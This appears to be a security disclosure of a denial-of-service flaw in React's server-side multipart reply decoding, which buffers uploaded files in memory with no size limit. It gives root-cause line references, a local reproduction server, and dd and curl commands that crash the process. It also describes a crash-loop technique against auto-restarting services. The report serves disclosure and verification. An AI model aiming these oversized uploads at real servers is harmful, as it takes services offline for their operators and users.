A. Vulnerability Summary
A remote attacker can crash a server that uses React's multipart reply decoding by uploading a large file, because React buffers the entire file in memory with no size limit.

B. Why It Is Exploitable (Root Cause)
In react-server, file parts are accumulated in an in-memory array of chunks with no byte cap:
ReactFlightReplyServer.js (line 1902) creates chunks: [] for each file handle.
ReactFlightReplyServer.js (line 1914) appends every chunk: handle.chunks.push(chunk).
ReactFlightReplyServer.js (line 1926) materializes the whole file into a Blob(handle.chunks, ...).

All Node multipart decoders in the RSC packages feed attacker-controlled chunks into that sink, e.g.:
ReactFlightDOMServerNode.js (line 597) calls resolveFileInfo(...)
ReactFlightDOMServerNode.js (line 599) calls resolveFileChunk(...) on every data event
ReactFlightDOMServerNode.js (line 603) calls resolveFileComplete(...) at end

No __DEV__ gating here; the behavior is production-relevant.

C. Real-World Impact
Process OOM and crash (or severe GC thrash), taking down SSR/RSC infrastructure.
If autoscaled/restarted, attacker can force crash loops and sustained outage by repeating requests.

D. Step-by-Step Reproduction
Preconditions: a Node server endpoint that accepts multipart/form-data and uses decodeReplyFromBusboy(...) (directly or via a framework integration) without strict upstream body/file size limits.

Create a minimal repro server (separate folder is easiest):

```bash
mkdir -p /tmp/rsc-file-dos && cd /tmp/rsc-file-dos
npm init -y
npm i react react-dom react-server-dom-webpack busboy
```

Create server.mjs:

```bash
import http from "node:http";
import Busboy from "busboy";

// IMPORTANT: import the ESM entry (not CJS require) so export conditions can apply.
import { decodeReplyFromBusboy } from "react-server-dom-webpack/server.node";

const webpackMap = {};

function mb(n) { return Math.round(n / 1024 / 1024); }

http.createServer((req, res) => {
  if (req.method !== "POST") {
    res.writeHead(200, { "content-type": "text/plain" });
    res.end("POST a multipart body\n");
    return;
  }

  const started = Date.now();
  const bb = Busboy({ headers: req.headers });

  const root = decodeReplyFromBusboy(bb, webpackMap);

  let bytesIn = 0;
  req.on("data", (buf) => (bytesIn += buf.length));

  const memTimer = setInterval(() => {
    const m = process.memoryUsage();
    console.log(
      `[+${((Date.now()-started)/1000).toFixed(1)}s] ` +
      `in=${mb(bytesIn)}MB rss=${mb(m.rss)}MB heapUsed=${mb(m.heapUsed)}MB ext=${mb(m.external)}MB`
    );
  }, 250);

  bb.on("finish", async () => {
    clearInterval(memTimer);
    try { await root; } catch {}
    res.writeHead(200, { "content-type": "text/plain" });
    res.end("done\n");
  });

  req.pipe(bb);
}).listen(3000, "127.0.0.1", () => {
  console.log("listening on http://127.0.0.1:3000");
});


```
Run it:

```bash
node server.mjs
```
Generate a large file (pick a size that will exceed your Node memory limit):

```bash
dd if=/dev/zero of=big.bin bs=10M count=300  # ~3GB
```


Send the attack request:

```bash
curl -F "file=@big.bin" http://127.0.0.1:3000/
```

Verify exploitation:
Watch the server logs: rss should climb roughly with upload size. Eventually the process will stall heavily or terminate (OOM), causing availability loss.

E. Exploit Chain Possibility
Practical chaining is "DoS amplification": if the target has an auto-restart supervisor, repeating the upload keeps it in a restart loop. If your app also has expensive per-request work after decode, this becomes even easier to sustain.
